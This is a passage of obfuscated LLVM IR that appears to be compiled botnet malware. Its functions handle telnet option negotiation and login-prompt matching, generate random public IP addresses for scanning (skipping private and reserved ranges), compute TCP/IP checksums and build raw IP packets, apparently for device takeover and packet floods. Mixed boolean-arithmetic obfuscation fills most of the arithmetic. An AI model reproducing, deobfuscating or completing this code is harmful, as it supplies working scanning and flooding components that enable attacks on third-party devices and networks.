  %39 = load i32, i32* %16, align 4
  %40 = icmp slt i32 %37, %39
  br i1 %40, label %41, label %51

; <label>:41:                                     ; preds = %33
  %42 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %43 = load i64, i64* %42, align 8
  %44 = icmp sgt i64 %43, 0
  br i1 %44, label %49, label %45

; <label>:45:                                     ; preds = %41
  %46 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %47 = load i64, i64* %46, align 8
  %48 = icmp sgt i64 %47, 0
  br label %49

; <label>:49:                                     ; preds = %45, %41
  %50 = phi i1 [ true, %41 ], [ %48, %45 ]
  br label %51

; <label>:51:                                     ; preds = %49, %33
  %52 = phi i1 [ false, %33 ], [ %50, %49 ]
  br i1 %52, label %53, label %151

; <label>:53:                                     ; preds = %51
  br label %54

; <label>:54:                                     ; preds = %53
  %55 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %56 = getelementptr inbounds [16 x i64], [16 x i64]* %55, i64 0, i64 0
  %57 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %56) #2, !srcloc !4
  %58 = extractvalue { i64, i64* } %57, 0
  %59 = extractvalue { i64, i64* } %57, 1
  %60 = trunc i64 %58 to i32
  store i32 %60, i32* %24, align 4
  %61 = ptrtoint i64* %59 to i64
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %25, align 4
  br label %63

; <label>:63:                                     ; preds = %54
  %64 = load i32, i32* %10, align 4
  %65 = srem i32 %64, 64
  %66 = zext i32 %65 to i64
  %67 = shl i64 1, %66
  %68 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %69 = load i32, i32* %10, align 4
  %70 = sdiv i32 %69, 64
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [16 x i64], [16 x i64]* %68, i64 0, i64 %71
  %73 = load i64, i64* %72, align 8
  %74 = and i64 %73, %67
  %75 = xor i64 %73, %67
  %76 = or i64 %74, %75
  %77 = or i64 %73, %67
  store i64 %76, i64* %72, align 8
  %78 = load i32, i32* %10, align 4
  %79 = sub i32 0, %78
  %80 = sub i32 0, 1
  %81 = add i32 %79, %80
  %82 = sub i32 0, %81
  %83 = add nsw i32 %78, 1
  %84 = call i32 @select(i32 %82, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %85 = icmp slt i32 %84, 1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %63
  br label %151

; <label>:87:                                     ; preds = %63
  %88 = load i8*, i8** %15, align 8
  %89 = load i32, i32* %18, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i8, i8* %88, i64 %90
  store i8* %91, i8** %23, align 8
  %92 = load i32, i32* %10, align 4
  %93 = load i8*, i8** %23, align 8
  %94 = call i64 @recv(i32 %92, i8* %93, i64 1, i32 0)
  %95 = trunc i64 %94 to i32
  store i32 %95, i32* %19, align 4
  %96 = load i32, i32* %19, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %101, label %98

; <label>:98:                                     ; preds = %87
  %99 = load i32, i32* %19, align 4
  %100 = icmp eq i32 %99, 0
  br i1 %100, label %101, label %102

; <label>:101:                                    ; preds = %98, %87
  store i32 0, i32* %9, align 4
  br label %156

; <label>:102:                                    ; preds = %98
  %103 = load i32, i32* %19, align 4
  %104 = load i32, i32* %18, align 4
  %105 = sub i32 0, %103
  %106 = sub i32 %104, %105
  %107 = add nsw i32 %104, %103
  store i32 %106, i32* %18, align 4
  %108 = load i8*, i8** %23, align 8
  %109 = load i8, i8* %108, align 1
  %110 = zext i8 %109 to i32
  %111 = icmp eq i32 %110, 255
  br i1 %111, label %112, label %136

; <label>:112:                                    ; preds = %102
  %113 = load i32, i32* %10, align 4
  %114 = load i8*, i8** %23, align 8
  %115 = getelementptr inbounds i8, i8* %114, i64 1
  %116 = call i64 @recv(i32 %113, i8* %115, i64 2, i32 0)
  %117 = trunc i64 %116 to i32
  store i32 %117, i32* %19, align 4
  %118 = load i32, i32* %19, align 4
  %119 = icmp eq i32 %118, -1
  br i1 %119, label %123, label %120

; <label>:120:                                    ; preds = %112
  %121 = load i32, i32* %19, align 4
  %122 = icmp eq i32 %121, 0
  br i1 %122, label %123, label %124

; <label>:123:                                    ; preds = %120, %112
  store i32 0, i32* %9, align 4
  br label %156

; <label>:124:                                    ; preds = %120
  %125 = load i32, i32* %19, align 4
  %126 = load i32, i32* %18, align 4
  %127 = sub i32 0, %125
  %128 = sub i32 %126, %127
  %129 = add nsw i32 %126, %125
  store i32 %128, i32* %18, align 4
  %130 = load i32, i32* %10, align 4
  %131 = load i8*, i8** %23, align 8
  %132 = call i32 @negotiate(i32 %130, i8* %131, i32 3)
  %133 = icmp ne i32 %132, 0
  br i1 %133, label %135, label %134

; <label>:134:                                    ; preds = %124
  store i32 0, i32* %9, align 4
  br label %156

; <label>:135:                                    ; preds = %124
  br label %150

; <label>:136:                                    ; preds = %102
  %137 = load i8*, i8** %15, align 8
  %138 = load i8*, i8** %11, align 8
  %139 = call i8* @strstr(i8* %137, i8* %138) #10
  %140 = icmp ne i8* %139, null
  br i1 %140, label %148, label %141

; <label>:141:                                    ; preds = %136
  %142 = load i32, i32* %12, align 4
  %143 = icmp ne i32 %142, 0
  br i1 %143, label %144, label %149

; <label>:144:                                    ; preds = %141
  %145 = load i8*, i8** %15, align 8
  %146 = call i32 @matchPrompt(i8* %145)
  %147 = icmp ne i32 %146, 0
  br i1 %147, label %148, label %149

; <label>:148:                                    ; preds = %144, %136
  store i32 1, i32* %20, align 4
  br label %151

; <label>:149:                                    ; preds = %144, %141
  br label %150

; <label>:150:                                    ; preds = %149, %135
  br label %33

; <label>:151:                                    ; preds = %148, %86, %51
  %152 = load i32, i32* %20, align 4
  %153 = icmp ne i32 %152, 0
  br i1 %153, label %154, label %155

; <label>:154:                                    ; preds = %151
  store i32 1, i32* %9, align 4
  br label %156

; <label>:155:                                    ; preds = %151
  store i32 0, i32* %9, align 4
  br label %156

; <label>:156:                                    ; preds = %155, %154, %134, %123, %101
  %157 = load i32, i32* %9, align 4
  ret i32 %157
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [16 x i8], align 16
  %3 = alloca [16 x i8], align 16
  %4 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %5 = zext i8 %4 to i32
  %6 = icmp slt i32 %5, 255
  br i1 %6, label %7, label %50

; <label>:7:                                      ; preds = %0
  %8 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %9 = zext i8 %8 to i32
  %10 = icmp slt i32 %9, 255
  br i1 %10, label %11, label %50

; <label>:11:                                     ; preds = %7
  %12 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %13 = zext i8 %12 to i32
  %14 = icmp slt i32 %13, 255
  br i1 %14, label %15, label %50

; <label>:15:                                     ; preds = %11
  %16 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %17 = zext i8 %16 to i32
  %18 = icmp slt i32 %17, 255
  br i1 %18, label %19, label %50

; <label>:19:                                     ; preds = %15
  %20 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %21 = add i8 %20, -56
  %22 = add i8 %21, 1
  %23 = sub i8 %22, -56
  %24 = add i8 %20, 1
  store i8 %23, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %25 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %26 = sub i8 0, 1
  %27 = sub i8 %25, %26
  %28 = add i8 %25, 1
  store i8 %27, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %29 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %30 = sub i8 0, 1
  %31 = sub i8 %29, %30
  %32 = add i8 %29, 1
  store i8 %31, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %33 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %34 = sub i8 %33, 79
  %35 = add i8 %34, 1
  %36 = add i8 %35, 79
  %37 = add i8 %33, 1
  store i8 %36, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %38 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %39 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %40 = zext i8 %39 to i32
  %41 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %42 = zext i8 %41 to i32
  %43 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %44 = zext i8 %43 to i32
  %45 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %46 = zext i8 %45 to i32
  %47 = call i32 (i8*, i8*, ...) @szprintf(i8* %38, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.24, i32 0, i32 0), i32 %40, i32 %42, i32 %44, i32 %46)
  %48 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %49 = call i32 @inet_addr(i8* %48) #2
  store i32 %49, i32* %1, align 4
  br label %207

; <label>:50:                                     ; preds = %15, %11, %7, %0
  %51 = call i32 @rand() #2
  %52 = srem i32 %51, 255
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %54 = call i32 @rand() #2
  %55 = srem i32 %54, 255
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %57 = call i32 @rand() #2
  %58 = srem i32 %57, 255
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %60 = call i32 @rand() #2
  %61 = srem i32 %60, 255
  %62 = trunc i32 %61 to i8
  store i8 %62, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  br label %63

; <label>:63:                                     ; preds = %181, %50
  %64 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 0
  br i1 %66, label %179, label %67

; <label>:67:                                     ; preds = %63
  %68 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %69 = zext i8 %68 to i32
  %70 = icmp eq i32 %69, 10
  br i1 %70, label %179, label %71

; <label>:71:                                     ; preds = %67
  %72 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %73 = zext i8 %72 to i32
  %74 = icmp eq i32 %73, 100
  br i1 %74, label %75, label %83

; <label>:75:                                     ; preds = %71
  %76 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %77 = zext i8 %76 to i32
  %78 = icmp sge i32 %77, 64
  br i1 %78, label %79, label %83

; <label>:79:                                     ; preds = %75
  %80 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %81 = zext i8 %80 to i32
  %82 = icmp sle i32 %81, 127
  br i1 %82, label %179, label %83

; <label>:83:                                     ; preds = %79, %75, %71
  %84 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %85 = zext i8 %84 to i32
  %86 = icmp eq i32 %85, 127
  br i1 %86, label %179, label %87

; <label>:87:                                     ; preds = %83
  %88 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %89 = zext i8 %88 to i32
  %90 = icmp eq i32 %89, 169
  br i1 %90, label %91, label %95

; <label>:91:                                     ; preds = %87
  %92 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %93 = zext i8 %92 to i32
  %94 = icmp eq i32 %93, 254
  br i1 %94, label %179, label %95

; <label>:95:                                     ; preds = %91, %87
  %96 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %97 = zext i8 %96 to i32
  %98 = icmp eq i32 %97, 172
  br i1 %98, label %99, label %107

; <label>:99:                                     ; preds = %95
  %100 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %101 = zext i8 %100 to i32
  %102 = icmp sle i32 %101, 16
  br i1 %102, label %103, label %107

; <label>:103:                                    ; preds = %99
  %104 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %105 = zext i8 %104 to i32
  %106 = icmp sle i32 %105, 31
  br i1 %106, label %179, label %107

; <label>:107:                                    ; preds = %103, %99, %95
  %108 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %109 = zext i8 %108 to i32
  %110 = icmp eq i32 %109, 192
  br i1 %110, label %111, label %119

; <label>:111:                                    ; preds = %107
  %112 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %113 = zext i8 %112 to i32
  %114 = icmp eq i32 %113, 0
  br i1 %114, label %115, label %119

; <label>:115:                                    ; preds = %111
  %116 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 2
  br i1 %118, label %179, label %119

; <label>:119:                                    ; preds = %115, %111, %107
  %120 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %121 = zext i8 %120 to i32
  %122 = icmp eq i32 %121, 192
  br i1 %122, label %123, label %131

; <label>:123:                                    ; preds = %119
  %124 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %125 = zext i8 %124 to i32
  %126 = icmp eq i32 %125, 88
  br i1 %126, label %127, label %131

; <label>:127:                                    ; preds = %123
  %128 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %129 = zext i8 %128 to i32
  %130 = icmp eq i32 %129, 99
  br i1 %130, label %179, label %131

; <label>:131:                                    ; preds = %127, %123, %119
  %132 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %133 = zext i8 %132 to i32
  %134 = icmp eq i32 %133, 192
  br i1 %134, label %135, label %139

; <label>:135:                                    ; preds = %131
  %136 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %137 = zext i8 %136 to i32
  %138 = icmp eq i32 %137, 168
  br i1 %138, label %179, label %139

; <label>:139:                                    ; preds = %135, %131
  %140 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %141 = zext i8 %140 to i32
  %142 = icmp eq i32 %141, 198
  br i1 %142, label %143, label %151

; <label>:143:                                    ; preds = %139
  %144 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %145 = zext i8 %144 to i32
  %146 = icmp eq i32 %145, 18
  br i1 %146, label %179, label %147

; <label>:147:                                    ; preds = %143
  %148 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %149 = zext i8 %148 to i32
  %150 = icmp eq i32 %149, 19
  br i1 %150, label %179, label %151

; <label>:151:                                    ; preds = %147, %139
  %152 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %153 = zext i8 %152 to i32
  %154 = icmp eq i32 %153, 198
  br i1 %154, label %155, label %163

; <label>:155:                                    ; preds = %151
  %156 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %157 = zext i8 %156 to i32
  %158 = icmp eq i32 %157, 51
  br i1 %158, label %159, label %163

; <label>:159:                                    ; preds = %155
  %160 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 100
  br i1 %162, label %179, label %163

; <label>:163:                                    ; preds = %159, %155, %151
  %164 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %165 = zext i8 %164 to i32
  %166 = icmp eq i32 %165, 203
  br i1 %166, label %167, label %175

; <label>:167:                                    ; preds = %163
  %168 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %169 = zext i8 %168 to i32
  %170 = icmp eq i32 %169, 0
  br i1 %170, label %171, label %175

; <label>:171:                                    ; preds = %167
  %172 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %173 = zext i8 %172 to i32
  %174 = icmp eq i32 %173, 113
  br i1 %174, label %179, label %175

; <label>:175:                                    ; preds = %171, %167, %163
  %176 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %177 = zext i8 %176 to i32
  %178 = icmp sge i32 %177, 224
  br label %179

; <label>:179:                                    ; preds = %175, %171, %159, %147, %143, %135, %127, %115, %103, %91, %83, %79, %67, %63
  %180 = phi i1 [ true, %171 ], [ true, %159 ], [ true, %147 ], [ true, %143 ], [ true, %135 ], [ true, %127 ], [ true, %115 ], [ true, %103 ], [ true, %91 ], [ true, %83 ], [ true, %79 ], [ true, %67 ], [ true, %63 ], [ %178, %175 ]
  br i1 %180, label %181, label %194

; <label>:181:                                    ; preds = %179
  %182 = call i32 @rand() #2
  %183 = srem i32 %182, 255
  %184 = trunc i32 %183 to i8
  store i8 %184, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %185 = call i32 @rand() #2
  %186 = srem i32 %185, 255
  %187 = trunc i32 %186 to i8
  store i8 %187, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %188 = call i32 @rand() #2
  %189 = srem i32 %188, 255
  %190 = trunc i32 %189 to i8
  store i8 %190, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %191 = call i32 @rand() #2
  %192 = srem i32 %191, 255
  %193 = trunc i32 %192 to i8
  store i8 %193, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  br label %63

; <label>:194:                                    ; preds = %179
  %195 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i32 0, i32 0
  %196 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %197 = zext i8 %196 to i32
  %198 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %199 = zext i8 %198 to i32
  %200 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %201 = zext i8 %200 to i32
  %202 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %203 = zext i8 %202 to i32
  %204 = call i32 (i8*, i8*, ...) @szprintf(i8* %195, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.24, i32 0, i32 0), i32 %197, i32 %199, i32 %201, i32 %203)
  %205 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i32 0, i32 0
  %206 = call i32 @inet_addr(i8* %205) #2
  store i32 %206, i32* %1, align 4
  br label %207

; <label>:207:                                    ; preds = %194, %19
  %208 = load i32, i32* %1, align 4
  ret i32 %208
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = xor i32 %5, -1
  %8 = xor i32 %6, -1
  %9 = xor i32 -54705437, -1
  %10 = or i32 %7, %8
  %11 = or i32 -54705437, %9
  %12 = xor i32 %10, -1
  %13 = and i32 %12, %11
  %14 = and i32 %5, %6
  store i32 %13, i32* %3, align 4
  %15 = load i32, i32* %3, align 4
  %16 = call i32 @rand_cmwc()
  %17 = load i32, i32* %2, align 4
  %18 = xor i32 %17, -1
  %19 = and i32 1148412193, %18
  %20 = xor i32 1148412193, -1
  %21 = and i32 %17, %20
  %22 = xor i32 -1, -1
  %23 = and i32 %22, 1148412193
  %24 = and i32 -1, %20
  %25 = or i32 %19, %21
  %26 = or i32 %23, %24
  %27 = xor i32 %25, %26
  %28 = xor i32 %17, -1
  %29 = xor i32 %27, -1
  %30 = xor i32 %16, %29
  %31 = and i32 %30, %16
  %32 = and i32 %16, %27
  %33 = xor i32 %15, -1
  %34 = and i32 %31, %33
  %35 = xor i32 %31, -1
  %36 = and i32 %15, %35
  %37 = or i32 %34, %36
  %38 = xor i32 %15, %31
  ret i32 %37
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %25

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = sub i64 0, %14
  %16 = sub i64 0, %13
  %17 = add i64 %15, %16
  %18 = sub i64 0, %17
  %19 = add i64 %14, %13
  store i64 %18, i64* %5, align 8
  %20 = load i32, i32* %4, align 4
  %21 = add i32 %20, 1658819740
  %22 = sub i32 %21, 2
  %23 = sub i32 %22, 1658819740
  %24 = sub nsw i32 %20, 2
  store i32 %23, i32* %4, align 4
  br label %6

; <label>:25:                                     ; preds = %6
  %26 = load i32, i32* %4, align 4
  %27 = icmp sgt i32 %26, 0
  br i1 %27, label %28, label %38

; <label>:28:                                     ; preds = %25
  %29 = load i16*, i16** %3, align 8
  %30 = bitcast i16* %29 to i8*
  %31 = load i8, i8* %30, align 1
  %32 = zext i8 %31 to i64
  %33 = load i64, i64* %5, align 8
  %34 = sub i64 %33, 7624937395212116499
  %35 = add i64 %34, %32
  %36 = add i64 %35, 7624937395212116499
  %37 = add i64 %33, %32
  store i64 %36, i64* %5, align 8
  br label %38

; <label>:38:                                     ; preds = %28, %25
  br label %39

; <label>:39:                                     ; preds = %43, %38
  %40 = load i64, i64* %5, align 8
  %41 = lshr i64 %40, 16
  %42 = icmp ne i64 %41, 0
  br i1 %42, label %43, label %55

; <label>:43:                                     ; preds = %39
  %44 = load i64, i64* %5, align 8
  %45 = xor i64 65535, -1
  %46 = xor i64 %44, %45
  %47 = and i64 %46, %44
  %48 = and i64 %44, 65535
  %49 = load i64, i64* %5, align 8
  %50 = lshr i64 %49, 16
  %51 = add i64 %47, 9198756374947192272
  %52 = add i64 %51, %50
  %53 = sub i64 %52, 9198756374947192272
  %54 = add i64 %47, %50
  store i64 %53, i64* %5, align 8
  br label %39

; <label>:55:                                     ; preds = %39
  %56 = load i64, i64* %5, align 8
  %57 = xor i64 %56, -1
  %58 = and i64 -1, %57
  %59 = xor i64 -1, -1
  %60 = and i64 %56, %59
  %61 = or i64 %58, %60
  %62 = xor i64 %56, -1
  %63 = trunc i64 %61 to i16
  ret i16 %63
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #2
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #2
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = xor i8 -16, -1
  %15 = xor i8 %13, %14
  %16 = and i8 %15, %13
  %17 = and i8 %13, -16
  %18 = xor i8 %16, -1
  %19 = xor i8 5, -1
  %20 = xor i8 -93, -1
  %21 = and i8 %18, -93
  %22 = and i8 %16, %20
  %23 = and i8 %19, -93
  %24 = and i8 5, %20
  %25 = or i8 %21, %22
  %26 = or i8 %23, %24
  %27 = xor i8 %25, %26
  %28 = or i8 %18, %19
  %29 = xor i8 %28, -1
  %30 = or i8 -93, %20
  %31 = and i8 %29, %30
  %32 = or i8 %27, %31
  %33 = or i8 %16, 5
  store i8 %32, i8* %12, align 4
  %34 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %35 = bitcast %struct.iphdr* %34 to i8*
  %36 = load i8, i8* %35, align 4
  %37 = xor i8 15, -1
  %38 = xor i8 %36, %37
  %39 = and i8 %38, %36
  %40 = and i8 %36, 15
  %41 = and i8 %39, 64
  %42 = xor i8 %39, 64
